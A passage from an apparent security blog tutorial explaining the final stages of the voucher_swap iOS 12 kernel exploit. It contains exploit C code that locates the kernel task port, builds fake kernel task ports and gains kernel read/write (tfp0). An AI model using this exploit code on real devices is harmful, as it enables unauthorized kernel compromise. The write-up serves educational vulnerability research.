<p>The following function checks whether a port is a kernel task port or not. It first looks up the bits field to see if it is of type <strong>IKOT_TASK</strong> to identify whether it is a task port. It then reads the address pointed to by the <strong>kobject</strong> field which is the corresponding task, looks up the <strong>bsd_info</strong> field in that task to find the <strong>proc</strong> structure it is pointing to, and then reads the <strong>pid</strong> value. If it is <strong>0</strong> this means it is the kernel task port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * stage1_check_kernel_task_port
     *
     * Description:
     * 	Check if the given ipc_port is a task port for the kernel task.
     */</span>
    <span class="k">static</span> <span class="n">bool</span>
    <span class="nf">stage1_check_kernel_task_port</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">candidate_port</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">kernel_task_address</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Check the ip_bits field.</span>
    	<span class="kt">uint32_t</span> <span class="n">ip_bits</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">candidate_port</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">));</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">ip_bits</span> <span class="o">!=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">))</span> <span class="p">{</span>
    		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// This is a task port. Get the task.</span>
    	<span class="kt">uint64_t</span> <span class="n">task</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">candidate_port</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">));</span>
    	<span class="c1">// Now get the task's PID.</span>
    	<span class="kt">uint64_t</span> <span class="n">proc</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">task</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">bsd_info</span><span class="p">));</span>
    	<span class="kt">uint32_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">stage1_read32</span><span class="p">(</span><span class="n">proc</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">));</span>
    	<span class="c1">// The kernel task has pid 0.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Found it!</span>
    	<span class="o">*</span><span class="n">kernel_task_address</span> <span class="o">=</span> <span class="n">task</span><span class="p">;</span>
    	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-25-get-the-address-of-the-vm_map">Step 25: Get the address of the vm_map</h4>

<p>Now that we have identified the kernel task port, we can read the <strong>vm_map</strong> since it is at a fixed offset.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 25\. Next we can use the kernel task to get the address of the kernel vm_map.</span>
    	<span class="kt">uint64_t</span> <span class="n">kernel_map</span> <span class="o">=</span> <span class="n">stage1_read64</span><span class="p">(</span><span class="n">kernel_task</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">map</span><span class="p">));</span></code></pre></figure>

<h4 id="step-26-create-a-fake-kernel-task-port">Step 26: Create a fake kernel task port</h4>

<p>Now we can build a fake kernel task port, all of which is still within the pipe buffer.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 26\. Build a fake kernel task port that allows us to read and write kernel memory.</span>
    	<span class="n">stage2_init</span><span class="p">(</span><span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="n">kernel_map</span><span class="p">);</span></code></pre></figure>

<p>The criteria for a fake kernel task port is that the fake task’s map field should point to the kernel <strong>vm_map</strong> and the receiver field should point to the <strong>ipc_space_kernel</strong>. This is acheived with the following 2 lines.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">FIELD</span><span class="p">(</span><span class="n">fake_task</span><span class="p">,</span> <span class="n">task</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">kernel_map</span><span class="p">;</span>
    <span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_receiver</span><span class="p">,</span>   <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">ipc_space_kernel</span><span class="p">;</span></code></pre></figure>

<h4 id="step-27-create-a-fake-kernel-task-port">Step 27: Create a fake kernel task port</h4>

<p>Now that we have a fully functioning kernel task port and we can call the Mach APIs to read and write memory, it is time to build a more stable kernel task port. This time, memory is allocated via <strong>mach_vm_allocate</strong> and the kernel task port may be created even outside the pipe buffer.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 27\. Alright, now kernel_read() and kernel_write() should work, so let's build a safer</span>
    	<span class="c1">// kernel_task port. This also cleans up fake_port so that we (hopefully) won't panic on</span>
    	<span class="c1">// exit.</span>
    	<span class="kt">uint64_t</span> <span class="n">task_pointer</span> <span class="o">=</span> <span class="n">task_port_address</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">);</span>
    	<span class="n">current_task</span> <span class="o">=</span> <span class="n">kernel_read64</span><span class="p">(</span><span class="n">task_pointer</span><span class="p">);</span>
    	<span class="n">stage3_init</span><span class="p">(</span><span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="n">kernel_map</span><span class="p">);</span>

    <span class="cm">/*
     * stage3_init
     *
     * Description:
     * 	Initialize the stage 3 kernel read/write primitives. After this, it's safe to free all
     * 	other resources.
     *
     * 	TODO: In the future we should use mach_vm_remap() here to actually get a second copy of the
     * 	real kernel_task.
     */</span>
    <span class="k">static</span> <span class="n">bool</span>
    <span class="nf">stage3_init</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">kernel_map</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0x800</span><span class="p">;</span>
    	<span class="c1">// Allocate some virtual memory.</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">page</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_vm_allocate</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">page</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">VM_FLAGS_ANYWHERE</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_vm_allocate"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="k">goto</span> <span class="n">fail_0</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Build the contents we want.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">data</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
    	<span class="n">build_fake_kernel_task</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ipc_space_kernel</span><span class="p">,</span> <span class="n">kernel_map</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_port_address</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
    	<span class="c1">// Copy the contents into the kernel.</span>
    	<span class="n">bool</span> <span class="n">ok</span> <span class="o">=</span> <span class="n">kernel_write</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not write fake kernel_task into kernel memory"</span><span class="p">);</span>
    		<span class="k">goto</span> <span class="n">fail_1</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="c1">// Modify fake_port's ipc_entry so that it points to our new fake port.</span>
    	<span class="kt">uint64_t</span> <span class="n">ipc_entry</span><span class="p">;</span>
    	<span class="n">ok</span> <span class="o">=</span> <span class="n">kernel_ipc_port_lookup</span><span class="p">(</span><span class="n">current_task</span><span class="p">,</span> <span class="n">fake_port</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ipc_entry</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not look up the IPC entry for the fake port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">kernel_write64</span><span class="p">(</span><span class="n">ipc_entry</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_entry</span><span class="p">,</span> <span class="n">ie_object</span><span class="p">),</span> <span class="n">fake_port_address</span><span class="p">);</span>
    	<span class="c1">// Clear ie_request to avoid a panic on termination.</span>
    	<span class="n">kernel_write32</span><span class="p">(</span><span class="n">ipc_entry</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_entry</span><span class="p">,</span> <span class="n">ie_request</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    	<span class="c1">// At this point fake_port has been officially donated to kernel_task_port.</span>
    	<span class="n">fake_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    	<span class="n">success</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="nl">fail_1:</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
    <span class="nl">fail_0:</span>
    	<span class="k">return</span> <span class="n">success</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-28-clean-up-the-unneeded-resources">Step 28: Clean up the unneeded resources</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 28\. We've corrupted a bunch of kernel state, so let's clean up our mess:</span>
    	<span class="c1">//   - base_port has an extra port reference.</span>
    	<span class="c1">//   - uaf_voucher_port needs to be destroyed.</span>
    	<span class="c1">//   - ip_requests needs to be deallocated.</span>
    	<span class="c1">//   - leaked_kmsgs need to be destroyed.</span>
    	<span class="n">clean_up</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">,</span> <span class="n">ip_requests</span><span class="p">,</span> <span class="n">leaked_kmsgs</span><span class="p">,</span>
    			<span class="k">sizeof</span><span class="p">(</span><span class="n">leaked_kmsgs</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leaked_kmsgs</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span></code></pre></figure>

<h4 id="step-29-clean-up-some-more-unneeded-resources-and-now-we-have-a-stable-tfp0">Step 29: Clean up some more unneeded resources and now we have a stable tfp0</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 29\. And finally, deallocate the remaining unneeded (but non-corrupted) resources.</span>
    	<span class="n">pipe_close</span><span class="p">(</span><span class="n">pipefds</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">pipe_buffer</span><span class="p">);</span>
    	<span class="n">mach_port_destroy</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">base_port</span><span class="p">);</span>

    	<span class="c1">// And that's it! Enjoy kernel read/write via kernel_task_port.</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"done! port 0x%x is tfp0"</span><span class="p">,</span> <span class="n">kernel_task_port</span><span class="p">);</span></code></pre></figure>

<p>All set, now we have acheived full kernel read/write.</p>

<h3 id="conclusion">Conclusion</h3>

<p>In this article, we looked at the voucher_swap() vulnerability discovered by <strong>@_bazad</strong> and explained the steps leading up to obtain tfp0 in iOS 12. In the next article, we will look at the <strong>Undecimus</strong> jailbreak and all the steps needed to successfully jailbreak an iOS device.</p>

<h3 id="references">References</h3>

<ol>
  <li>Project Zero Issue tracker - https://bugs.chromium.org/p/project-zero/issues/detail?id=1731</li>
  <li>iOS 10 - Kernel Heap Revisited - https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf</li>
  <li>Mac OS X Internals: A Systems Approach - https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>MacOS and iOS Internals, Volume III: Security &amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535</li>
  <li>CanSecWest 2017 - Port(al) to the iOS Core - https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core</li>
</ol>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html">
            ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free.html">
            ARM64 Reversing and Exploitation Part 2 - Use After Free
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow.html">
            ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/android/" class="set-1">android</a> <a href="/tag/authentication/" class="set-1">authentication</a> <a href="/tag/backtrack/" class="set-1">backtrack</a> <a href="/tag/burpsuite/" class="set-1">burpsuite</a> <a href="/tag/defcon/" class="set-1">defcon</a> <a href="/tag/dns/" class="set-1">dns</a> <a href="/tag/honeypots/" class="set-1">honeypots</a> <a href="/tag/ios/" class="set-1">ios</a> <a href="/tag/maintaining-access/" class="set-1">maintaining-access</a> <a href="/tag/meshnet/" class="set-1">meshnet</a> <a href="/tag/metasploit/" class="set-1">metasploit</a> <a href="/tag/networking/" class="set-1">networking</a> <a href="/tag/privacy/" class="set-1">privacy</a> <a href="/tag/security/" class="set-5">security</a> <a href="/tag/timing-analysis-attacks/" class="set-1">timing-analysis-attacks</a> <a href="/tag/w3af/" class="set-1">w3af</a> <a href="/tag/web-application-security/" class="set-1">web-application-security</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
